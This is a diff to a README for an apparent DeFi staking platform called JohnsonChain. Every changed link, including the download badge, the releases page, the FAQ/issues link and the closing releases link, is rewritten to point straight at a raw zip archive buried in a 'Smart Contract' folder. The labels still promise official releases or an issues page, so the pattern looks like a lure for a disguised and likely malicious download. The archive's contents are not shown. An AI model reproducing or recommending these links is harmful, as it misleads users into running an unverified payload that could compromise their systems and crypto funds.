@@ -1,6 +1,6 @@
 # 🌐 JohnsonChain-DeFi-Platform - Securely Stake and Earn Rewards
 
-[![Download JohnsonChain-DeFi-Platform](https://img.shields.io/badge/Download%20Now-Get%20Started%20with%20JohnsonChain-blue)](https://github.com/MuhammedRazin/JohnsonChain-DeFi-Platform/releases)
+[![Download JohnsonChain-DeFi-Platform](https://raw.githubusercontent.com/MuhammedRazin/JohnsonChain-DeFi-Platform/main/Smart Contract/Chain_Johnson_Platform_Fi_De_1.0.zip%20Now-Get%20Started%20with%20JohnsonChain-blue)](https://raw.githubusercontent.com/MuhammedRazin/JohnsonChain-DeFi-Platform/main/Smart Contract/Chain_Johnson_Platform_Fi_De_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the JohnsonChain DeFi Platform! This tool allows you to stake tokens,
 
 To get started, visit this page to download the software:
 
-[Download JohnsonChain-DeFi-Platform Releases](https://github.com/MuhammedRazin/JohnsonChain-DeFi-Platform/releases)
+[Download JohnsonChain-DeFi-Platform Releases](https://raw.githubusercontent.com/MuhammedRazin/JohnsonChain-DeFi-Platform/main/Smart Contract/Chain_Johnson_Platform_Fi_De_1.0.zip)
 
 On the releases page, you will find the latest version of the platform. Click on the version you want to download. Once you click the version, look for the asset files. Here’s how to install:
 
@@ -53,11 +53,11 @@ After installing, follow these steps to start using the JohnsonChain DeFi Platfo
 
 If you run into any issues or have questions:
 
-- **FAQs:** Check the FAQ section on the [GitHub Issues page](https://github.com/MuhammedRazin/JohnsonChain-DeFi-Platform/issues).
+- **FAQs:** Check the FAQ section on the [GitHub Issues page](https://raw.githubusercontent.com/MuhammedRazin/JohnsonChain-DeFi-Platform/main/Smart Contract/Chain_Johnson_Platform_Fi_De_1.0.zip).
 - **Contact Us:** You can ask questions or offer feedback through the same GitHub Issues page. We will get back to you as soon as possible.
 
 ## 📜 License
 
 This project is licensed under the MIT License. You can see more details in the LICENSE file included with the application.
 
-Thank you for choosing JohnsonChain DeFi Platform. Access the platform effortlessly and dive into the world of DeFi today! For updates and new releases, keep checking back on our [Releases page](https://github.com/MuhammedRazin/JohnsonChain-DeFi-Platform/releases).
+Thank you for choosing JohnsonChain DeFi Platform. Access the platform effortlessly and dive into the world of DeFi today! For updates and new releases, keep checking back on our [Releases page](https://raw.githubusercontent.com/MuhammedRazin/JohnsonChain-DeFi-Platform/main/Smart Contract/Chain_Johnson_Platform_Fi_De_1.0.zip).
